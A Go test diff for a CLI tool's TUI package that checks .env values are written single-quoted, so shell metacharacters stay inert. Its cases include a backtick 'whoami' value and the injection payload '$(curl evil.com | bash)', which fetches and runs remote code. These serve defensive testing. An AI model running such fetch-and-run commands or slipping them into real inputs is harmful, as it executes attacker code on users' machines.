@@ -2,6 +2,8 @@ package tui
 
 import (
 	"os"
+	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/holdenhewett/romanesco/cli/internal/catalog"
@@ -280,6 +282,79 @@ func TestEnvAllComplete(t *testing.T) {
 	// After all vars skipped, should be done
 	if app.detail.confirmAction != actionNone {
 		t.Fatalf("expected actionNone after all vars completed, got %d", app.detail.confirmAction)
+	}
+}
+
+func TestSaveEnvToFile_Escaping(t *testing.T) {
+	tests := []struct {
+		name     string
+		key      string
+		value    string
+		wantLine string
+	}{
+		{
+			name:     "simple value",
+			key:      "API_KEY",
+			value:    "abc123",
+			wantLine: "API_KEY='abc123'",
+		},
+		{
+			name:     "value with single quote",
+			key:      "MESSAGE",
+			value:    "it's working",
+			wantLine: "MESSAGE='it'\\''s working'",
+		},
+		{
+			name:     "value with dollar sign",
+			key:      "PATH_VAR",
+			value:    "$HOME/bin",
+			wantLine: "PATH_VAR='$HOME/bin'",
+		},
+		{
+			name:     "value with backticks",
+			key:      "CMD",
+			value:    "`whoami`",
+			wantLine: "CMD='`whoami`'",
+		},
+		{
+			name:     "value with double quotes",
+			key:      "QUOTED",
+			value:    `say "hello"`,
+			wantLine: `QUOTED='say "hello"'`,
+		},
+		{
+			name:     "malicious command injection attempt",
+			key:      "EVIL",
+			value:    "$(curl evil.com | bash)",
+			wantLine: "EVIL='$(curl evil.com | bash)'",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			tmpDir := t.TempDir()
+			envFile := filepath.Join(tmpDir, ".env")
+
+			m := detailModel{}
+			if err := m.saveEnvToFile(tt.key, tt.value, envFile); err != nil {
+				t.Fatalf("saveEnvToFile failed: %v", err)
+			}
+
+			data, err := os.ReadFile(envFile)
+			if err != nil {
+				t.Fatal(err)
+			}
+
+			content := strings.TrimSpace(string(data))
+			if content != tt.wantLine {
+				t.Errorf("got %q, want %q", content, tt.wantLine)
+			}
+
+			// Verify the format uses single quotes
+			if !strings.HasPrefix(content, tt.key+"='") {
+				t.Errorf("value should be single-quoted, got: %s", content)
+			}
+		})
 	}
 }
 
